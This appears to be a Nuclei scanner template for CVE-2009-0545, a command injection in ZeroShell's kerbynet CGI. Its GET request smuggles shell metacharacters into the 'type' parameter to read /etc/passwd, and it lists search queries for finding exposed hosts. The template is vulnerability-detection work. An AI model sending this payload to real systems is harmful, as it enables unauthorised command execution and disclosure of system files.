id: CVE-2009-0545

info:
  name: ZeroShell <= 1.0beta11 Remote Code Execution
  author: geeknik
  severity: critical
  description: ZeroShell 1.0beta11 and earlier via cgi-bin/kerbynet allows remote attackers to execute arbitrary commands through shell metacharacters in the type parameter in a NoAuthREQ x509List action.
  impact: |
    Successful exploitation of this vulnerability allows remote attackers to execute arbitrary code on the affected system.
  remediation: |
    Upgrade to a patched version of ZeroShell.
  reference:
    - https://www.exploit-db.com/exploits/8023
    - https://nvd.nist.gov/vuln/detail/CVE-2009-0545
    - http://www.zeroshell.net/eng/announcements/
    - http://www.ikkisoft.com/stuff/LC-2009-01.txt
    - http://www.vupen.com/english/advisories/2009/0385
  classification:
    cvss-metrics: CVSS:2.0/AV:N/AC:L/Au:N/C:C/I:C/A:C
    cvss-score: 10
    cve-id: CVE-2009-0545
    cwe-id: CWE-20
    epss-score: 0.94006
    epss-percentile: 0.9989
    cpe: cpe:2.3:a:zeroshell:zeroshell:1.0:beta1:*:*:*:*:*:*
  metadata:
    max-request: 1
    vendor: zeroshell
    product: zeroshell
    shodan-query: http.title:"zeroshell"
    fofa-query: title="zeroshell"
    google-query: intitle:"zeroshell"
  tags: cve,cve2009,edb,zeroshell,kerbynet,rce,vkev,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/cgi-bin/kerbynet?Section=NoAuthREQ&Action=x509List&type=*%22;/root/kerbynet.cgi/scripts/getkey%20../../../etc/passwd;%22"

    matchers:
      - type: regex
        part: body
        regex:
          - "root:.*:0:0:"
# digest: 4b0a0048304602210092c18036d1e1daeee9969b870d7874de57e3aa71b94ed1f3d2c63ebf15556239022100df80ba7ebae815d95e1026be22cd7f5ea2b878c3e6cd07b53ad56ca0edf0c75f:922c64590222798bb761d5b6d8e72950